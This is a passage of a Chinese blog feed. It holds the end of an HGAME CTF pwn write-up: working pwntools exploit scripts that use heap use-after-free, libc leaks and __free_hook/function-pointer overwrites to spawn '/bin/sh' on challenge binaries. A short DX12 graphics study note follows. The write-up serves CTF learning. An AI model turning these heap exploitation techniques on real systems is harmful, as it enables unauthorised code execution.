add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'protected_chunk'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">b'X'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment"># 推送 main_arena, 这地方不熟，还是选择调试出来的偏移</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token comment"># 改变 delete 为 puts</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>plt_puts<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">16</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token comment"># 改变 delete 为 system</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsystem<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>容器扩张导致迭代器失效，这里我可能叙述有问题，没有很仔细的分析。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407135659622.png" alt="image-20220407135659622"></p>
<p>导致容器中存在两个一样的指针，就可以实现 UAF 了，由于是 libc-2.31.so ，接下来可以直接进行一波 fastbin attack。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> system
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vector'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>ori_index<span class="token punctuation">,</span> tar_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ori_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">b'is this one your want to move? [1/0]\n>> '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'is this one your want to move? [1/0]\n>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'which index you want move to?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tar_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'idx'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token number">0x100</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>

move<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:10'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
    
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsystem<span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还有 final 的题目，mark</p>
]]></content>
      <categories>
        <category>HGAME</category>
        <category>留坑</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 第八章学习</title>
    <url>/2022/03/17/d3d12-8/</url>
    <content><![CDATA[<h1 id="DX12-8th"><a href="#DX12-8th" class="headerlink" title="DX12-8th"></a>DX12-8th</h1><p>算是复习一点 games101 的东西了。</p>
<h2 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h2><p>变换法向量，证明过程使用 un<sup>T</sup> &#x3D; u·n 蛮有意思</p>
<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="26.198ex" height="2.583ex" role="img" focusable="false" viewBox="0 -891.7 11579.5 1141.7" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="MJX-1-TEX-I-1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path><path id="MJX-1-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-I-1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path><path id="MJX-1-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path id="MJX-1-TEX-N-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path><path id="MJX-1-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path id="MJX-1-TEX-I-1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><use data-c="1D462" xlink:href="#MJX-1-TEX-I-1D462"></use></g><g data-mml-node="mo" transform="translate(794.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1294.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(2172.2,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mi" transform="translate(3228,0)"><use data-c="1D462" xlink:href="#MJX-1-TEX-I-1D462"></use></g><g data-mml-node="mi" transform="translate(3800,0)"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="mo" transform="translate(4772.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(5272.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(5872.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mo" transform="translate(6261.4,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(6650.4,0)"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="msup" transform="translate(7400.4,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><use data-c="2212" xlink:href="#MJX-1-TEX-N-2212"></use></g><g data-mml-node="mn" transform="translate(778,0)"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use></g></g></g><g data-mml-node="msup" transform="translate(8776.1,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D447" xlink:href="#MJX-1-TEX-I-1D447"></use></g></g></g><g data-mml-node="mo" transform="translate(10023.7,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="mn" transform="translate(11079.5,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g></g></g></svg></mjx-container>


<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>朗伯余弦定理，辐射通量（radiant flux），辐照度（irradiance）。</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>漫反射（diffuse）</p>
